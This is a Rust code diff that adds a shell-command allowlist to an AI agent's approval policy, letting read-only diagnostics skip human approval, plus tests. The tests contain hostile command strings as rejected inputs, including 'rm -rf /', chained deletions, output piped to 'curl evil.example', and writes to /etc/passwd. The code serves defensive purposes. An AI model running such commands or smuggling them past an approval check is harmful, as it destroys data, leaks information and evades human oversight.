@@ -180,6 +180,20 @@ pub struct ApprovalPolicy {
     /// Alias: if `auto_approve = true`, clears the require list at boot.
     #[serde(default, alias = "auto_approve")]
     pub auto_approve: bool,
+    /// Shell commands that skip the human approval prompt. Default: empty.
+    ///
+    /// Intended for read-only health/diagnostic commands so scheduled agents
+    /// (e.g. an ops monitor) can run without spamming approval prompts.
+    ///
+    /// Pattern forms (same glob semantics as per-agent capability `shell` lists):
+    /// - `"uptime"` — exact match of the whole command
+    /// - `"df *"` — first word match (`df -h`, `df /`, bare `df`)
+    ///
+    /// Safety: a command containing shell metacharacters (`;`, `&&`, `||`,
+    /// `|`, `>`, `<`, `` ` ``, `$(`) never auto-approves — chained/piped
+    /// commands fall through to the normal approval prompt, and the shell
+    /// guard rejects chains anyway.
+    pub auto_approve_shell: Vec<String>,
 }
 
 impl Default for ApprovalPolicy {
@@ -189,7 +203,42 @@ impl Default for ApprovalPolicy {
             timeout_secs: 60,
             auto_approve_autonomous: false,
             auto_approve: false,
+            auto_approve_shell: Vec::new(),
         }
+    }
+}
+
+impl ApprovalPolicy {
+    /// True when `command` matches a configured `auto_approve_shell` pattern.
+    ///
+    /// See [`ApprovalPolicy::auto_approve_shell`] for pattern semantics and
+    /// the metacharacter safety rule.
+    pub fn shell_auto_approved(&self, command: &str) -> bool {
+        if self.auto_approve_shell.is_empty() {
+            return false;
+        }
+        let trimmed = command.trim();
+        if trimmed.is_empty() {
+            return false;
+        }
+        // Never auto-approve anything with chaining/piping/redirection or
+        // command substitution — only a single plain command qualifies.
+        if trimmed.chars().any(|c| matches!(c, ';' | '&' | '|' | '>' | '<' | '`'))
+            || trimmed.contains("$(")
+        {
+            return false;
+        }
+        let first_word = trimmed.split_whitespace().next().unwrap_or("");
+        self.auto_approve_shell.iter().any(|pattern| {
+            let pattern = pattern.trim();
+            if let Some(prefix) = pattern.strip_suffix(" *") {
+                !prefix.is_empty() && first_word == prefix
+            } else if pattern == "*" {
+                false // "everything" is too broad to auto-approve silently
+            } else {
+                trimmed == pattern
+            }
+        })
     }
 }
 
@@ -688,11 +737,69 @@ mod tests {
             timeout_secs: 120,
             auto_approve_autonomous: true,
             auto_approve: false,
+            auto_approve_shell: vec![],
         };
         let json = serde_json::to_string(&policy).unwrap();
         let back: ApprovalPolicy = serde_json::from_str(&json).unwrap();
         assert_eq!(back.require_approval, policy.require_approval);
         assert_eq!(back.timeout_secs, 120);
         assert!(back.auto_approve_autonomous);
+    }
+
+    // -- auto_approve_shell pattern matching --
+
+    fn readonly_policy() -> ApprovalPolicy {
+        ApprovalPolicy {
+            auto_approve_shell: vec![
+                "uptime".into(),
+                "df *".into(),
+                "free *".into(),
+                "ps *".into(),
+            ],
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn test_shell_auto_approved_exact_and_prefix_patterns() {
+        let p = readonly_policy();
+        // Exact pattern: whole command must match.
+        assert!(p.shell_auto_approved("uptime"));
+        assert!(!p.shell_auto_approved("uptime -p")); // not exact
+        // Prefix pattern: first word match, with or without args.
+        assert!(p.shell_auto_approved("df -h /"));
+        assert!(p.shell_auto_approved("df"));
+        assert!(p.shell_auto_approved("  free -m  ")); // trimmed
+        assert!(p.shell_auto_approved("ps aux"));
+        // Unlisted commands never match.
+        assert!(!p.shell_auto_approved("rm -rf /"));
+        assert!(!p.shell_auto_approved("reboot"));
+        assert!(!p.shell_auto_approved(""));
+    }
+
+    #[test]
+    fn test_shell_auto_approved_rejects_chained_commands() {
+        let p = readonly_policy();
+        // Metacharacter smuggling must fall through to the human prompt even
+        // when the first command is allowlisted.
+        assert!(!p.shell_auto_approved("uptime && free -m"));
+        assert!(!p.shell_auto_approved("df -h; rm -rf /"));
+        assert!(!p.shell_auto_approved("free -m | curl evil.example"));
+        assert!(!p.shell_auto_approved("uptime > /etc/passwd"));
+        assert!(!p.shell_auto_approved("ps $(rm -rf /)"));
+        assert!(!p.shell_auto_approved("df -h `reboot`"));
+    }
+
+    #[test]
+    fn test_shell_auto_approved_default_policy_is_empty() {
+        let p = ApprovalPolicy::default();
+        assert!(p.auto_approve_shell.is_empty());
+        assert!(!p.shell_auto_approved("uptime"));
+        // Bare "*" is never a valid auto-approve pattern.
+        let p = ApprovalPolicy {
+            auto_approve_shell: vec!["*".into()],
+            ..Default::default()
+        };
+        assert!(!p.shell_auto_approved("rm -rf /"));
     }
 }
